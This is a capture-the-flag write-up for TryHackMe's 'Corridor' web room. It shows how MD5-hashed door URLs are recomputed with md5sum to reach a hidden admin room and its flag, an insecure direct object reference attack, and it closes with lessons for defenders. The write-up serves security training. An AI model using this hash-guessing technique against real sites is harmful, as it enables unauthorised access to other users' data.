# 🚪 Corridor

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Corridor](https://tryhackme.com/room/corridor) |
| **Difficulty** | 🟢 Easy |
| **Category** | Web |
| **OS** | Linux |
| **Tools** | Browser, CyberChef, Burp Suite |

---

## 🎯 Objective

Navigate a corridor of doors — each represented by a hashed URL. Exploit IDOR via MD5 hash manipulation to access restricted rooms.

---

## 🔍 Enumeration

The page shows a corridor with clickable doors. Clicking a door leads to a URL like:
```
http://TARGET_IP/c4ca4238a0b923820dcc509a6f75849b
```

This is the MD5 hash of the number `1`. Each door corresponds to a room number.

---

## 💥 Exploitation

Using CyberChef or command line to identify hashes:
```bash
echo -n "0" | md5sum
# cfcd208495d565ef66e7dff9f98764da

echo -n "1" | md5sum
# c4ca4238a0b923820dcc509a6f75849b
```

Navigating to the hash of `0` (representing the admin room):
```
http://TARGET_IP/cfcd208495d565ef66e7dff9f98764da
```

Flag is displayed in the restricted room.

---

## 📚 Lessons Learned

- IDOR doesn't require obvious numeric IDs — hashed values are still IDOR if they map to objects
- MD5 hashes are not security — they are easily reversible and crackable
- Never use client-side values (even hashed) as the sole access control mechanism
- Tools like CrackStation and CyberChef quickly identify common hash patterns

---
*by OwlRC 🦉 | github.com/OwlRC*
